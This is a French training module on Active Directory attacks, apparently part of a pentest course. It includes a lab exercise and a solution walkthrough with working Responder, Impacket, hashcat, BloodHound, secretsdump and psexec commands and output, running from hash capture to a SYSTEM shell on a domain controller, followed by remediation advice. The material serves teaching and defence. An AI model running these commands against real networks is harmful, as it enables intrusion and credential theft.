---
tags:
  - hacking
  - active-directory
  - windows
  - kerberos
  - formation
---

# Module 4 : Active Directory Hacking

90% des entreprises du Fortune 500 utilisent Active Directory. Si vous tombez l'AD, vous possédez l'entreprise.

## 1. Concepts Clés

*   **Domain Controller (DC)** : Le serveur maître (contient la base `NTDS.dit` avec tous les mots de passe).
*   **Kerberos** : Le protocole d'authentification (Tickets TGT / TGS).
*   **NTLM** : Ancien protocole (vulnérable au Relay).

## 2. LLMNR / NBT-NS Poisoning

Quand Windows ne trouve pas un nom DNS, il crie sur le réseau local : "Qui est 'SRV-IMPRIMANTE' ?".
L'attaquant répond : "C'est moi ! Envoie-moi ton hash de mot de passe."

**Outil : Responder**
```bash
sudo responder -I eth0 -dwv
```
Dès qu'un utilisateur se trompe en tapant un chemin réseau, vous capturez son hash NTLMv2.

## 3. Kerberoasting

Cible : Les comptes de service (Service Accounts) qui ont un SPN (Service Principal Name).
Tout utilisateur authentifié peut demander un ticket TGS pour ces services. Ce ticket est chiffré avec le mot de passe du service. On peut donc le "cracker" hors ligne.

**Outil : Impacket**
```bash
GetUserSPNs.py domain.local/user:password -request
```

## 4. BloodHound : La Carte au Trésor

BloodHound utilise la théorie des graphes pour trouver le chemin le plus court vers "Domain Admin".

1.  **Collecte** : Un "Ingestor" (SharpHound) récupère toutes les infos (qui est admin de quoi, qui est connecté où).
2.  **Analyse** : BloodHound affiche le graphe.
    *   *Exemple* : User A -> Admin local sur PC B -> PC B a une session de User C -> User C est Domain Admin.

## 5. Pass-the-Hash (PtH)

Si vous avez un hash NTLM (mais pas le mot de passe clair), vous pouvez quand même vous authentifier !

```bash
# Authentification sans connaître le mot de passe
crackmapexec smb 192.168.1.20 -u Administrator -H <HASH_NTLM>
```

---

## Exercice Pratique

!!! example "Exercice : Attaque d'un Domaine Active Directory"

    **Objectif** : Compromettre un environnement Active Directory en utilisant plusieurs techniques.

    **Prérequis** :
    - Environnement de lab AD (VulnLab, HackTheBox Pro Labs, ou votre propre lab)
    - Kali Linux avec Impacket, Responder, BloodHound installés
    - Accès réseau au domaine cible (ex: `corp.local`)

    **Scénario** : Vous avez un accès réseau au domaine mais aucune credential initiale.

    **Phase 1 : Obtention de Credentials Initiales**

    1. **LLMNR/NBT-NS Poisoning** :
       ```bash
       sudo responder -I eth0 -dwv
       ```
       Attendez qu'un utilisateur effectue une erreur de frappe réseau.

    2. **Cracking du hash** :
       ```bash
       hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
       ```

    **Phase 2 : Énumération du Domaine**

    1. **Collecte BloodHound** :
       ```bash
       bloodhound-python -u user -p password -d corp.local -ns 192.168.1.10 -c All
       ```

    2. **Analyse** : Importez les données dans BloodHound et cherchez :
       - Chemin vers Domain Admins
       - Comptes avec SPN (pour Kerberoasting)
       - Machines où les DA sont connectés

    **Phase 3 : Kerberoasting**

    1. **Extraction des tickets** :
       ```bash
       GetUserSPNs.py corp.local/user:password -request -outputfile spn_tickets.txt
       ```

    2. **Cracking** :
       ```bash
       hashcat -m 13100 spn_tickets.txt /usr/share/wordlists/rockyou.txt
       ```

    **Phase 4 : Mouvement Latéral**

    1. **Énumération des accès** :
       ```bash
       crackmapexec smb 192.168.1.0/24 -u svc_account -p cracked_password --shares
       ```

    2. **Pass-the-Hash vers machine critique** :
       ```bash
       psexec.py corp.local/Administrator@192.168.1.20 -hashes :NTLM_HASH
       ```

    **Questions** :
    - Quel utilisateur avez-vous compromis en premier ?
    - Combien de sauts (hops) dans BloodHound pour atteindre Domain Admin ?
    - Quel compte de service était Kerberoastable ?

??? quote "Solution"

    **Phase 1 : Obtention de Credentials**

    ```bash
    # Lancement de Responder
    sudo responder -I eth0 -dwv

    # Un utilisateur tape \\SRV-IMPRIMENTE (faute de frappe)
    # Responder capture le hash NTLMv2
    [+] Listening for events...
    [SMB] NTLMv2-SSP Client   : 192.168.1.50
    [SMB] NTLMv2-SSP Username : CORP\jdoe
    [SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:A1B2C3...
    ```

    **Cracking avec Hashcat** :
    ```bash
    echo "jdoe::CORP:1122334455667788:A1B2C3..." > hash.txt
    hashcat -m 5600 hash.txt rockyou.txt

    # Résultat après 2 minutes :
    # jdoe::CORP:...:Summer2023!
    ```

    **Credentials obtenues** : `jdoe:Summer2023!`

    **Phase 2 : Énumération BloodHound**

    ```bash
    bloodhound-python -u jdoe -p 'Summer2023!' -d corp.local -ns 192.168.1.10 -c All

    # Fichiers générés :
    # computers.json, users.json, groups.json, domains.json
    ```

    **Dans BloodHound UI** :
    - Requête : "Shortest Paths to Domain Admins from Owned Principals"
    - Marquez `JDOE@CORP.LOCAL` comme "Owned"
    - **Résultat** : JDOE → Membre de "IT-SUPPORT" → AdminLocal sur "SRV-SQL" → "SVC-SQL" connecté sur "SRV-SQL" → "SVC-SQL" membre de "Domain Admins"

    **Phase 3 : Kerberoasting**

    ```bash
    GetUserSPNs.py corp.local/jdoe:'Summer2023!' -request

    # Output :
    ServicePrincipalName        Name     MemberOf                      PasswordLastSet
    --------------------------  -------  ---------------------------   -------------------
    MSSQLSvc/SRV-SQL.corp.local svc-sql  CN=Domain Admins,CN=Users...  2022-03-15 10:30:00

    $krb5tgs$23$*svc-sql$CORP.LOCAL$...[HASH]...
    ```

    **Cracking du ticket** :
    ```bash
    hashcat -m 13100 svc_sql_ticket.txt rockyou.txt --force

    # Password trouvé : MSSQLService123
    ```

    **Phase 4 : Pass-the-Hash et Compromission**

    ```bash
    # Test du compte compromis
    crackmapexec smb 192.168.1.20 -u svc-sql -p 'MSSQLService123' -d corp.local
    # SMB  192.168.1.20  445  SRV-SQL  [+] corp.local\svc-sql:MSSQLService123 (Pwn3d!)

    # Extraction du hash NTLM via secretsdump
    secretsdump.py corp.local/svc-sql:'MSSQLService123'@192.168.1.20
    # Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

    # Pass-the-Hash pour devenir Domain Admin
    psexec.py Administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

    [*] Requesting shares on 192.168.1.10.....
    [*] Found writable share ADMIN$
    [*] Uploading file...
    [*] Opening SVCManager on 192.168.1.10.....
    [*] Starting service...
    [!] Launching semi-interactive shell - CTRL+C to exit

    C:\Windows\system32> whoami
    nt authority\system

    C:\Windows\system32> whoami /groups
    # BUILTIN\Administrators
    # NT AUTHORITY\SYSTEM
    ```

    **Récapitulatif de la Chaîne d'Attaque** :

    1. **LLMNR Poisoning** → Hash NTLMv2 de `jdoe`
    2. **Hashcat** → Mot de passe clair `Summer2023!`
    3. **BloodHound** → Identification du chemin d'attaque
    4. **Kerberoasting** → Ticket TGS de `svc-sql` (Domain Admin)
    5. **Hashcat** → Mot de passe `MSSQLService123`
    6. **Pass-the-Hash** → Accès Domain Controller en tant que SYSTEM

    **Réponses aux Questions** :
    - **Premier utilisateur compromis** : `jdoe` (via Responder)
    - **Nombre de sauts vers DA** : 3 sauts (jdoe → IT-SUPPORT → SRV-SQL → svc-sql)
    - **Compte Kerberoastable** : `svc-sql` avec SPN `MSSQLSvc/SRV-SQL.corp.local`

    **Recommandations de Remédiation** :

    1. **LLMNR/NBT-NS** :
       - Désactiver LLMNR et NBT-NS via GPO
       - Déployer SMB Signing obligatoire

    2. **Kerberoasting** :
       - Utiliser des mots de passe longs (>25 caractères) pour les comptes de service
       - Migrer vers des Group Managed Service Accounts (gMSA)
       - Monitorer les demandes de tickets TGS anormales

    3. **Pass-the-Hash** :
       - Implémenter LAPS (Local Administrator Password Solution)
       - Activer Credential Guard sur Windows 10/11
       - Segmenter les comptes : pas de DA sur des workstations

    4. **Architecture** :
       - Modèle de tiering (Tier 0 = DC, Tier 1 = Serveurs, Tier 2 = Workstations)
       - Principe du moindre privilège strictement appliqué
       - Rotation régulière des mots de passe des comptes privilégiés

---

## Navigation

| | |
|:---|---:|
| [← Module 3 : Web Hacking](03-module.md) | [Module 5 : Post-Exploitation & PrivEsc →](05-module.md) |

[Retour au Programme](index.md){ .md-button }
